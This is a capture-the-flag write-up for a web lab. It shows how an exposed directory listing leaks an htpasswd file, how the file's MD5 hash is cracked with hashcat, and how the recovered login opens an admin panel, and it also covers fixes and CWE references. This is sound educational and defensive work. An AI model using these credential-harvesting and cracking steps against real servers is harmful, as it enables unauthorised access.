# Hidden Files — Documentation

## How I Found It

**Initial reconnaissance:**
- Explored different URL paths: `http://192.168.1.16/whatever/`
- Server returned directory listing instead of 403 Forbidden:
```html
<h1>Index of /whatever/</h1>
<a href="htpasswd">htpasswd</a>    29-Jun-2021 18:09    38
```

**Discovery:**
- Downloaded `htpasswd` file
- Contents: `root:437394baff5aa33daa618be47b75cb49`
- Recognized MD5 hash format (32 characters)
- Cracked hash using online decoder → `qwerty123@`
- Found admin panel at `/admin/`
- Logged in with `root:qwerty123@` → Flag revealed

## How I Exploited It

**Step-by-step:**

1. **Access directory listing:**
```bash
curl http://192.168.1.16/whatever/
```

2. **Download htpasswd:**
```bash
wget http://192.168.1.16/whatever/htpasswd
cat htpasswd
# root:437394baff5aa33daa618be47b75cb49
```

3. **Crack MD5 hash:**
```bash
# Online: https://crackstation.net/
# Offline:
echo "437394baff5aa33daa618be47b75cb49" > hash.txt
hashcat -m 0 -a 0 hash.txt rockyou.txt
# Result: qwerty123@
```

4. **Login to admin:**
```bash
curl -X POST \
  -d "username=root&password=qwerty123@&Login=Login" \
  http://192.168.1.16/admin/
```

Or browser: Navigate to `/admin/` → Enter `root:qwerty123@`

**Flag obtained:**
```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## Why It Works

**Vulnerabilities:**
1. **Directory listing enabled** → Exposes sensitive files
2. **Exposed credentials file** → htpasswd accessible without authentication
3. **Weak MD5 hashing** → No salt, easily cracked with rainbow tables
4. **Weak password** → Common password in breach databases

**Related:**
- CWE-548: Directory Listing
- CWE-522: Insufficiently Protected Credentials
- CWE-327: Broken Cryptographic Algorithm
- OWASP A01:2021 – Broken Access Control

## How to Fix It

**Immediate fixes:**

1. **Disable directory listing:**
```nginx
# Nginx
location /whatever/ { autoindex off; }
```
```apache
# Apache
Options -Indexes
```

2. **Secure sensitive files:**
```bash
mv /var/www/html/whatever/htpasswd /etc/secure/
chmod 600 /etc/secure/htpasswd
```

3. **Use strong hashing (bcrypt):**
```bash
htpasswd -B -C 12 /etc/secure/.htpasswd root
```

4. **Block sensitive file access:**
```apache
<Files "htpasswd">
    Require all denied
</Files>
```

**Long-term improvements:**

1. **Strong password policy** (min 12 chars, complexity checks)
2. **Multi-Factor Authentication**
3. **Access control for admin:**
```nginx
location /admin/ {
    allow 10.0.0.0/8;  # Internal only
    deny all;
}
```
4. **Regular security audits:**
```bash
find /var/www -name "*passwd" -o -name ".ht*"
```

**Testing:**
```bash
# Should return 403 Forbidden
curl http://192.168.1.16/whatever/
curl http://192.168.1.16/whatever/htpasswd
```

## References

- OWASP A01:2021 – Broken Access Control — https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- CWE-548: Directory Listing — https://cwe.mitre.org/data/definitions/548.html
- CWE-522: Insufficiently Protected Credentials — https://cwe.mitre.org/data/definitions/522.html
- OWASP Password Storage Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html